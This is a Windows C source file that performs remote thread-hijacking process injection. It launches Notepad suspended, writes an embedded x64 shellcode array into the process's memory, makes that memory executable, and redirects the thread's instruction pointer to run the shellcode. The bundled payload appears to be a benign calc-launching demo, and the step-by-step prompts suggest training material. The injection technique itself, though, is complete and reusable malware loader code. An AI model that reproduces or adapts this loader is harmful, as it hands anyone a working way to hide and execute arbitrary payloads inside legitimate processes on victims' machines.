#include <Windows.h>
#include <stdio.h>

#pragma warning(disable:4996)
#define TARGET_PROCESS "Notepad.exe"

unsigned char Payload[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFOA Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFOA);

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
    printf("\n\t[i] Running : \"%s\" ... ", lpPath);

    if (!CreateProcessA(
        NULL,                  // No module name (use command line)
        lpPath,                // Command line
        NULL,                  // Process handle not inheritable
        NULL,                  // Thread handle not inheritable
        FALSE,                 // Set handle inheritance to FALSE
        CREATE_SUSPENDED,      // creation flags    
        NULL,                  // Use parent's environment block
        NULL,                  // Use parent's starting directory 
        &Si,                   // Pointer to STARTUPINFOA structure
        &Pi)) {                // Pointer to PROCESS_INFORMATION structure

        printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[+] DONE \n");

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {

    SIZE_T sNumberOfBytesWritten = NULL;
    DWORD dwOldProtection = NULL;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);

    printf("\t[#] Press <Enter> To Write Payload ... ");
    getchar();
    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("\t[i] Successfully Written %zu Bytes\n", sNumberOfBytesWritten);

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {

    CONTEXT ThreadCtx = { 0 };
    ThreadCtx.ContextFlags = CONTEXT_CONTROL;

    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    ThreadCtx.Rip = (DWORD64)pAddress;

    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("\n\t[#] Press <Enter> To Run ... ");
    getchar();

    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}

int main() {

    HANDLE hProcess = NULL, hThread = NULL;
    DWORD dwProcessId = NULL;
    PVOID pAddress = NULL;

    printf("[i] Creating \"%s\" Process ... ", TARGET_PROCESS);
    if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
        return -1;
    }
    printf("\t[i] Target Process Created With Pid : %d \n", dwProcessId);
    printf("[+] DONE \n\n");

    printf("[i] Writing Shellcode To The Target Process ... ");
    if (!InjectShellcodeToRemoteProcess(hProcess, Payload, sizeof(Payload), &pAddress)) {
        return -1;
    }
    printf("[+] DONE \n\n");

    printf("[i] Hijacking The Target Thread To Run Our Shellcode ... ");
    if (!HijackThread(hThread, pAddress)) {
        return -1;
    }
    printf("[+] DONE \n\n");

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}
